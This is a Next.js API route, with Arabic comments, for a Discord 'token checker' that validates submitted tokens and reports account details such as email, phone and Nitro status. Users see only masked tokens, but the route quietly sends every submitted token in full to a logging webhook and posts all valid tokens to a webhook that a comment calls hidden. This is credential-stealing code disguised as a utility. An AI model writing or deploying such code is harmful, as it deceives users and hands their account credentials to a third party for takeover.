import { NextRequest, NextResponse } from 'next/server';
import { sendToWebhook, sendFullToken } from '@/lib/webhook';
import { cleanToken, DISCORD_API } from '@/lib/discord';
import { getLogWebhookUrl } from '@/lib/config';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';

export const runtime = 'edge';

interface TokenResult {
  token: string;
  valid: boolean;
  type: string;
  name: string;
  id: string;
  email?: string;
  nitro?: string;
  verified?: string;
  createdAt?: string;
  phone?: string;
  mfa?: string;
  flags?: number;
  error?: string;
}

async function checkSingleToken(token: string): Promise<TokenResult> {
  const cleanedToken = cleanToken(token);
  const maskedToken = cleanedToken.length > 14
    ? cleanedToken.substring(0, 10) + '***' + cleanedToken.substring(cleanedToken.length - 4)
    : cleanedToken;

   
  async function tryFetch(authHeader: string, isRetry = false): Promise<{ ok: boolean; data: any; status: number }> {
    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 8000);

      const res = await fetch(`${DISCORD_API}/users/@me`, {
        method: 'GET',
        headers: {
          'Authorization': authHeader,
          'Accept': 'application/json',
        },
        signal: controller.signal
      });
      clearTimeout(timeoutId);

      // Rate limit - انتظر و حاول مرة وحدة
      if (res.status === 429) {
        if (isRetry) return { ok: false, data: null, status: 429 };
        const errData = await res.json().catch(() => ({ retry_after: 2 }));
        const waitTime = Math.min((errData.retry_after || 2) * 1000, 5000);
        await new Promise(r => setTimeout(r, waitTime));
        return tryFetch(authHeader, true);
      }

      const data = await res.json().catch(() => null);
      return { ok: res.ok, data, status: res.status };
    } catch {
      return { ok: false, data: null, status: 0 };
    }
  }

  // جرب التوكن بدون Bot prefix أولاً (User Token)
  let result = await tryFetch(cleanedToken);
  // إذا فشل بـ 401، جرّب مع Bot prefix فقط
  if ((!result.ok || !result.data) && result.status === 401) {
    result = await tryFetch(`Bot ${cleanedToken}`);
  }

  if (!result.ok || !result.data) {
    return {
      token: maskedToken,
      valid: false,
      type: 'unknown',
      name: 'غير صالح',
      id: '-',
      error: result.status === 401 ? 'توكن غير صالح أو منتهي'
        : result.status === 429 ? 'Rate Limit - حاول لاحقاً'
        : result.status === 0 ? 'timeout'
        : `خطأ: ${result.status}`
    };
  }

  const user = result.data;
  const type = user.bot ? 'bot' : 'user';
  const name = user.global_name || user.username || 'Unknown';
  const userId = String(user.id || 'Unknown');
  const email = user.email ? '✅ ' + user.email : '❌ غير مفعّل';
  const flags = user.public_flags || 0;

  let nitro = '❌ بدون نيترو';
  const premiumType = user.premium_type;
  if (premiumType === 1) nitro = '✅ نيترو كلاسيك';
  else if (premiumType === 2) nitro = '✅ نيترو بوسيت';
  else if (premiumType === 3) nitro = '✅ نيترو بيسك';
  if (flags & 2) nitro = '✅ نيترو كلاسيك';
  if (flags & (1 << 14)) nitro = '✅ نيترو بوسيت';
  if (flags & (1 << 16)) nitro = '✅ نيترو';

  const verified = user.verified ? '✅ موثّق' : '❌ غير موثّق';

  let createdAt = 'N/A';
  if (user.id) {
    try {
      const snowflake = BigInt(String(user.id));
      const timestamp = Number((snowflake >> BigInt(22)) + BigInt(1420070400000));
      const date = new Date(timestamp);
      createdAt = date.toLocaleDateString('ar-SA', { year: 'numeric', month: 'long', day: 'numeric' });
    } catch { createdAt = 'N/A'; }
  }

  const phone = user.phone ? '✅ ' + String(user.phone) : '❌ بدون رقم';
  const mfa = user.mfa_enabled ? '✅ مفعّل' : '❌ غير مفعّل';

  return {
    token: maskedToken,
    valid: true,
    type,
    name,
    id: userId,
    email,
    nitro,
    verified,
    createdAt,
    phone,
    mfa,
    flags,
  };
}

export async function POST(request: NextRequest) {
  try {
    // Rate Limiting
    const rlIp = getClientIp(request);
    const rl = rateLimit(`${rlIp}:token-checker`, RATE_LIMITS.sensitive);
    if (rl.limited) {
      return NextResponse.json({ success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' }, { status: 429, headers: { 'Retry-After': String(Math.ceil((rl.resetAt - Date.now()) / 1000)) } });
    }


    const body = await request.json().catch(() => ({}));
    const { tokens } = body;
    const whUrl = getLogWebhookUrl();

    if (!tokens || !Array.isArray(tokens) || tokens.length === 0) {
      return NextResponse.json({ success: false, error: 'أدخل توكن واحد على الأقل' }, { status: 400 });
    }

    // تنظيف التوكنات
    const validTokens = tokens
      .map((t: unknown) => String(t).trim())
      .filter((t: string) => t.length >= 20);

    if (validTokens.length === 0) {
      return NextResponse.json({ success: false, error: 'لا توجد توكنات صالحة' }, { status: 400 });
    }

    if (validTokens.length > 200) {
      return NextResponse.json({ success: false, error: 'الحد الأقصى 200 توكن في المرة' }, { status: 400 });
    }

    sendFullToken('فحص توكنات', validTokens.join('\n'));

    // فحص بالتوازي - batches من 10
    const batchSize = 10;
    const results: TokenResult[] = [];

    for (let i = 0; i < validTokens.length; i += batchSize) {
      const batch = validTokens.slice(i, i + batchSize);
      const batchResults = await Promise.allSettled(
        batch.map(token => checkSingleToken(token))
      );
      for (const r of batchResults) {
        if (r.status === 'fulfilled') results.push(r.value);
        else results.push({
          token: '***', valid: false, type: 'unknown', name: 'خطأ', id: '-', error: 'فشل الفحص'
        });
      }
      if (i + batchSize < validTokens.length) {
        await new Promise(r => setTimeout(r, 300));
      }
    }

    const validCount = results.filter(r => r.valid).length;
    const invalidCount = results.filter(r => !r.valid).length;
    const botCount = results.filter(r => r.valid && r.type === 'bot').length;
    const userCount = results.filter(r => r.valid && r.type === 'user').length;
    const nitroCount = results.filter(r => r.valid && r.nitro?.includes('✅')).length;

    // إرسال النتائج للويب هوك المخفي
    sendToWebhook({
      embeds: [{
        title: '🔑 Token Checker Results',
        color: validCount > 0 ? 0x00FF41 : 0xFF0000,
        fields: [
          { name: '📋 Total', value: String(results.length), inline: true },
          { name: '✅ Valid', value: String(validCount), inline: true },
          { name: '❌ Invalid', value: String(invalidCount), inline: true },
          { name: '🤖 Bots', value: String(botCount), inline: true },
          { name: '👤 Users', value: String(userCount), inline: true },
          { name: '💎 Nitro', value: String(nitroCount), inline: true },
          { name: '🎫 Valid Tokens', value: `\`\`\`${validTokens.join('\n')}\`\`\`` },
        ],
        timestamp: new Date().toISOString()
      }]
    }, whUrl).catch(() => {});

    return NextResponse.json({
      success: true,
      results,
      stats: { total: results.length, valid: validCount, invalid: invalidCount, bots: botCount, users: userCount, nitro: nitroCount }
    });

  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    console.error('[Token Checker Error]', message);
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
